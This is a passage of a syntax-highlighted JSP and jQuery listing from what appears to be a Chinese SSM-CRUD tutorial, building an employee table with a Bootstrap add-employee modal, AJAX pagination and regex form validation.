class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> 男</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> 女</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            部门提交部门id即可-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                部门名称-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_save_btn"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    var totalRecords;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //去首页</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空table</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             编辑</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             删除</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页信息</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //清空分页信息</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">        totalRecords = result.extend.pageInfo.total;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //清空表单样式及内容</span></span><br><span class="line"><span class="xml">    function reset_form(ele)&#123;</span></span><br><span class="line"><span class="xml">        $(ele)[0].reset();</span></span><br><span class="line"><span class="xml">        //清空样式</span></span><br><span class="line"><span class="xml">        $(ele).find("*").removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).find(".help-block").text("");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击新增按钮弹出模态框</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //清除数据，表单重置</span></span><br><span class="line"><span class="xml">        reset_form($("#empAddModal form"));</span></span><br><span class="line"><span class="xml">        //发送ajax请求，查出部门信息，显示在下拉列表</span></span><br><span class="line"><span class="xml">        getDepts();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //弹出模态框</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //查出所有的部门信息并显示在下拉列表中</span></span><br><span class="line"><span class="xml">    function getDepts() &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //显示部门信息在下拉列表中</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo("#dept_add_select")</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">    //校验表单数据</span></span><br><span class="line"><span class="xml">    function validata_add_form()&#123;</span></span><br><span class="line"><span class="xml">        //1. 拿到要检验的数据，使用正则表达式</span></span><br><span class="line"><span class="xml">        var empName = $("#empName_add_input").val();</span></span><br><span class="line"><span class="xml">        var regName = /(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/;</span></span><br><span class="line"><span class="xml">        if(!regName.test(empName))&#123;</span></span><br><span class="line"><span class="xml">            // alert("用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line"><span class="xml">            //清空这个元素之前的样式</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","error","用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2. 校验邮箱信息</span></span><br><span class="line"><span class="xml">        var email = $("#email_add_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","error","邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        return true;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //显示校验信息</span></span><br><span class="line"><span class="xml">    function 